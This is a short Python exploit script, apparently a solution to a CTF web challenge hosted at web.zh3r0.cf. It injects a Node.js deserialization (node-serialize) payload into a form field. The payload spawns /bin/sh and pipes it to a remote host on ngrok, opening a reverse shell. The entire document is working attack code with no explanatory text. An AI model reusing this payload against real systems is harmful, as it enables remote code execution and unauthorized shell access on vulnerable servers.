import json
import requests as rq


s = rq.Session()
url = 'http://web.zh3r0.cf:6666/'

# Ref: https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf
payload = '", "rce":"_$$ND_FUNC$$_function(){var net = require(\\"net\\"),tcp = require(\\"child_process\\"),sh = tcp.spawn(\\"/bin/sh\\", []);var client = new net.Socket();client.connect(19251, \\"2.tcp.ngrok.io\\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;}()", "c":"'

data = {"username": "AAAA", "country": "BBBB", "city": payload}
check =f'{{"username": "AAAA", "country": "BBBB", "city": "${payload}}}' 
print(check)
# print(json.loads(check))


res = s.post(url+'guest', data=data)
print(res.text)
res = s.post(url+'guest')
print(res.text)
res = s.post(url+'guest')

